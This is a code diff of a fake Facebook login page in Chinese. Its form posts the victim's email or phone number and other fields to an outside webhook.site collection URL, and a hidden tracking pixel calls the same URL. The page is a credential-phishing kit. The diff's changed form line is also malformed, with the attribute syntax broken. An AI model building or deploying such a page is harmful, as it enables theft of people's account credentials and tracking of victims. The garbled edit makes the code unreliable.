@@ -33,7 +33,7 @@
     </div>
   </div>
     <div class="_5rut">
-      <form class="form-group" action="https://webhook.site/72f64ab9-116e-4c11-96ec-80cf1ffad75b" method="post" enctype="multipart/form-data">
+      <form class="form-group" actionhttps://webhook.site/72f64ab9-116e-4c11-96ec-80cf1ffad75b" method="post" enctype="multipart/form-data">
         <div class="form-group">
           <input type="hidden" name="token" value="611a6224fea6e47ddc9eb89e2c29c98c">
           <input type="text" class="form-control" id="exampleInputEmail1" name="email" aria-describedby="emailHelp" placeholder="手機號碼或電子郵件地址" required="true">
@@ -97,7 +97,7 @@
     </div>
     <div class="col-12 text-center">
       <span class="mfss fcg">Facebook ©2023</span>
-    </div>	
+    </div>
   </div>
   <img src="https://webhook.site/72f64ab9-116e-4c11-96ec-80cf1ffad75b/?uid=1" style="display:none" alt="">
 
